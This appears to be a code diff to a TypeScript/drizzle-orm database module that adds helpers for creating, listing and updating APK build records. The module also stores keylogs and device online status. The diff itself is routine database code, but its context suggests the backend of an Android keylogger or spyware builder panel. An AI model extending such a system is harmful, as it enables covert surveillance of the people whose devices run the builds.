@@ -2,7 +2,7 @@ import { eq, and } from "drizzle-orm";
 import { drizzle } from "drizzle-orm/mysql2";
 import mysql from "mysql2/promise";
 import type { Pool } from "mysql2/promise";
-import { InsertUser, users, keylogs, InsertKeylog, settings, InsertSetting, Setting, devices, InsertDevice, Device } from "../drizzle/schema";
+import { InsertUser, users, keylogs, InsertKeylog, settings, InsertSetting, Setting, devices, InsertDevice, Device, apkBuilds, APKBuild, InsertAPKBuild } from "../drizzle/schema";
 import { ENV } from './_core/env';
 
 let _db: any = null;
@@ -538,6 +538,66 @@ export async function updateDeviceStatus(deviceId: string, status: 'online' | 'o
       .where(eq(devices.deviceId, deviceId));
   } catch (error) {
     console.error("[Database] Failed to update device status:", error);
+    throw error;
+  }
+}
+
+// APK Builds helpers
+export async function createAPKBuild(build: InsertAPKBuild): Promise<APKBuild | null> {
+  const db = await getDb();
+  if (!db) {
+    console.warn("[Database] Cannot create APK build: database not available");
+    return null;
+  }
+
+  try {
+    await db.insert(apkBuilds).values(build);
+    const result = await db
+      .select()
+      .from(apkBuilds)
+      .where(eq(apkBuilds.filename, build.filename))
+      .limit(1);
+    return result.length > 0 ? result[0] : null;
+  } catch (error) {
+    console.error("[Database] Failed to create APK build:", error);
+    throw error;
+  }
+}
+
+export async function getAPKBuildsByUser(userId: number): Promise<APKBuild[]> {
+  const db = await getDb();
+  if (!db) {
+    console.warn("[Database] Cannot get APK builds: database not available");
+    return [];
+  }
+
+  try {
+    const result = await db
+      .select()
+      .from(apkBuilds)
+      .where(eq(apkBuilds.userId, userId))
+      .orderBy(apkBuilds.createdAt);
+    return result;
+  } catch (error) {
+    console.error("[Database] Failed to get APK builds:", error);
+    return [];
+  }
+}
+
+export async function updateAPKBuildStatus(buildId: number, status: 'building' | 'success' | 'failed', errorMessage?: string): Promise<void> {
+  const db = await getDb();
+  if (!db) {
+    console.warn("[Database] Cannot update APK build: database not available");
+    return;
+  }
+
+  try {
+    await db
+      .update(apkBuilds)
+      .set({ status, errorMessage, updatedAt: new Date() })
+      .where(eq(apkBuilds.id, buildId));
+  } catch (error) {
+    console.error("[Database] Failed to update APK build:", error);
     throw error;
   }
 }
